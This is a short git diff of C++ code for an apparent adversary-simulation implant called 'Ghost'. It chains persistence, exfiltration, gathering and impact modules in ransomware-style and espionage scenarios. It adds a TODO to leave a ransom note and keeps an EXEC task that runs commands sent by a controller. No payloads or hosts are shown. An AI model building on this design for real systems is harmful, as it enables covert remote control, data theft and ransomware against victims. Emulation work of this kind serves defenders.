@@ -61,12 +61,17 @@ void Ghost::runScenario(ScenarioType type) {
             modules["PERSIST"]->execute();  // TODO: make this more granular with specific method instead of the orchestrating module
             modules["EXFIL"]->execute();
             modules["IMPACT"]->execute();
+            // TODO: leave a ransom note
             break;
         #elif defined(SCENARIO_ESPIONAGE)
         case ScenarioType::ESPIONAGE:
             modules["GATHER"]->execute();
             modules["EXFIL"]->execute();
-            modules["PERSIST"]->execute();
+            // modules["PERSIST"]->execute();
+
+            // run has persistence for now
+            // TODO: adjust that
+            this->run();
             break;
         #endif
         default:
@@ -161,10 +166,10 @@ void Ghost::processTask(const json& task) {
     if (command == "EXEC") {
         output = SystemUtils::ExecuteCommand(args);
         status = TaskStatus::Done;
-    } else if (command == "STOP_HAUNT") {   // ideally we'd want to reverse simulation artifacts
-        LOG_ALERT("GOODBYE")                // but for now it's bening enough to warrant not doing that
+    } else if (command == "STOP_HAUNT") {
+        LOG_ALERT("GOODBYE")
         cleanup();
-        destroy();                          // TODO: think about IModule->reverse() and compiling that only in debug
+        destroy();
         exit(0);
     }
     #ifdef FEATURE_IMPACT
